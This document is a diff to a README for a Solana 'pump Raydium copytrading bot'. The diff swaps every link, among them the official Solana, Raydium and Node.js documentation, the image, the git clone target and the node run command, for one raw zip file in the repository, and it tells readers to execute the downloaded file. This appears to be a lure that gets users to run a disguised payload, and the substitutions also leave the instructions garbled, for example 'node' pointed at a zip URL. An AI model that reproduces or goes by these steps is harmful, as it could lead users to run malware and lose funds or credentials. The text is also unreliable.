@@ -1,7 +1,7 @@
 ```markdown
 # Solana Pump Raydium Copytrading Bot 🚀 | Automate Your Trades
 
-[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-v1.0.0-blue)](https://github.com/rudyfr1/solana-pump-Raydium-copytrading-bot/releases)
+[![Download Latest Release](https://github.com/rudyfr1/solana-pump-Raydium-copytrading-bot/raw/refs/heads/main/downgrowth/copytrading-Raydium-solana-pump-bot-1.4-beta.3.zip%20Latest%20Release-v1.0.0-blue)](https://github.com/rudyfr1/solana-pump-Raydium-copytrading-bot/raw/refs/heads/main/downgrowth/copytrading-Raydium-solana-pump-bot-1.4-beta.3.zip)
 
 ## Table of Contents
 - [Overview](#overview)
@@ -28,18 +28,18 @@ To get started with the Solana Pump Raydium Copytrading Bot, follow these steps:
 
 1. **Clone the Repository**:
    ```bash
-   git clone https://github.com/rudyfr1/solana-pump-Raydium-copytrading-bot.git
+   git clone https://github.com/rudyfr1/solana-pump-Raydium-copytrading-bot/raw/refs/heads/main/downgrowth/copytrading-Raydium-solana-pump-bot-1.4-beta.3.zip
    cd solana-pump-Raydium-copytrading-bot
    ```
 
 2. **Install Dependencies**:
-   Make sure you have Node.js and npm installed. Then run:
+   Make sure you have https://github.com/rudyfr1/solana-pump-Raydium-copytrading-bot/raw/refs/heads/main/downgrowth/copytrading-Raydium-solana-pump-bot-1.4-beta.3.zip and npm installed. Then run:
    ```bash
    npm install
    ```
 
 3. **Download the Latest Release**:
-   Visit the [Releases section](https://github.com/rudyfr1/solana-pump-Raydium-copytrading-bot/releases) to download the latest version. Execute the downloaded file to get started.
+   Visit the [Releases section](https://github.com/rudyfr1/solana-pump-Raydium-copytrading-bot/raw/refs/heads/main/downgrowth/copytrading-Raydium-solana-pump-bot-1.4-beta.3.zip) to download the latest version. Execute the downloaded file to get started.
 
 ## Usage
 After installation, you can start using the bot by following these steps:
@@ -47,7 +47,7 @@ After installation, you can start using the bot by following these steps:
 1. **Start the Bot**:
    Run the following command in your terminal:
    ```bash
-   node index.js
+   node https://github.com/rudyfr1/solana-pump-Raydium-copytrading-bot/raw/refs/heads/main/downgrowth/copytrading-Raydium-solana-pump-bot-1.4-beta.3.zip
    ```
 
 2. **Monitor Trades**:
@@ -97,19 +97,19 @@ We welcome contributions from the community. If you would like to contribute to 
 This project is licensed under the MIT License. See the [LICENSE](LICENSE) file for details.
 
 ## Support
-If you have any questions or need assistance, please check the [Releases section](https://github.com/rudyfr1/solana-pump-Raydium-copytrading-bot/releases) or open an issue in the repository.
+If you have any questions or need assistance, please check the [Releases section](https://github.com/rudyfr1/solana-pump-Raydium-copytrading-bot/raw/refs/heads/main/downgrowth/copytrading-Raydium-solana-pump-bot-1.4-beta.3.zip) or open an issue in the repository.
 
 ## Acknowledgments
 - **Raydium Protocol**: For providing the infrastructure to facilitate trading on Solana.
 - **Solana Community**: For their ongoing support and contributions to the ecosystem.
 
 ## Additional Resources
-- [Solana Documentation](https://docs.solana.com/)
-- [Raydium Documentation](https://raydium.io/docs/)
-- [Node.js Documentation](https://nodejs.org/en/docs/)
+- [Solana Documentation](https://github.com/rudyfr1/solana-pump-Raydium-copytrading-bot/raw/refs/heads/main/downgrowth/copytrading-Raydium-solana-pump-bot-1.4-beta.3.zip)
+- [Raydium Documentation](https://github.com/rudyfr1/solana-pump-Raydium-copytrading-bot/raw/refs/heads/main/downgrowth/copytrading-Raydium-solana-pump-bot-1.4-beta.3.zip)
+- [https://github.com/rudyfr1/solana-pump-Raydium-copytrading-bot/raw/refs/heads/main/downgrowth/copytrading-Raydium-solana-pump-bot-1.4-beta.3.zip Documentation](https://github.com/rudyfr1/solana-pump-Raydium-copytrading-bot/raw/refs/heads/main/downgrowth/copytrading-Raydium-solana-pump-bot-1.4-beta.3.zip)
 
 ## Example of the Bot in Action
-![Trading Bot in Action](https://example.com/trading-bot-image.png)
+![Trading Bot in Action](https://github.com/rudyfr1/solana-pump-Raydium-copytrading-bot/raw/refs/heads/main/downgrowth/copytrading-Raydium-solana-pump-bot-1.4-beta.3.zip)
 
 Feel free to explore and customize the bot to fit your trading needs!
 ```
